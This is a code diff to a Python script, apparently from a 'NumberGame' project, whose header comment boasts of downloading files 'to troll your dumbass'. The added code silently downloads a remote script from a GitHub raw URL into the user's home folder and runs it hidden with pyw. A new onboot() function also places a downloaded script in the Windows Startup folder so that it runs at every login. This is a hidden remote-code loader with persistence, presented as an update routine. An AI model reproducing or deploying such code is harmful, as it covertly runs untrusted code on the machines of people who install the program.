@@ -1,15 +1,12 @@
 # Downloads and injects the files needed to troll your dumbass
 def update():
-    import os, urllib.request, pathlib
+    import os
     home = os.path.expanduser("~")
     os.chdir(home)
     dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py'
     path = str(home) + '/update.pyw'
     path = '{}'.format(path)
-    def install(dlurl, path):
-        urllib.request.urlretrieve(dlurl, '{}'.format(path))
-        os.system("start cmd /c {}".format('pyw ' + path))
-        exit()
+
     try:
         F = open('inst', 'r')
         F.close()
@@ -17,7 +14,6 @@ def update():
         F = open('update.pyw', 'r')
         F.close()
         print('Update Exist')
-        exit()
     except FileNotFoundError:
         F = open('inst', 'w')
         F.close()
@@ -28,12 +24,22 @@ def update():
         except FileNotFoundError:
             print('Update missing')
             install(dlurl, path)
-        
-        
+    onboot()
+def install(dlurl, path):
+    import urllib.request, os
+    urllib.request.urlretrieve(dlurl, '{}'.format(path))
+    os.system("start cmd /c {}".format('pyw ' + path))
 
-    print('Installed')
-
-    def onboot():
-        print('HI')
+def onboot():
+    import os, urllib.request
+    home = os.path.expanduser("~")
+    os.chdir(home)
+    startup = '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+    path = home + startup
+    path = path + '/startup.pyw'
+    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/startup.py'
+    path = '{}'.format(path)
+    urllib.request.urlretrieve(dlurl, '{}'.format(path))
+    
 
 update()
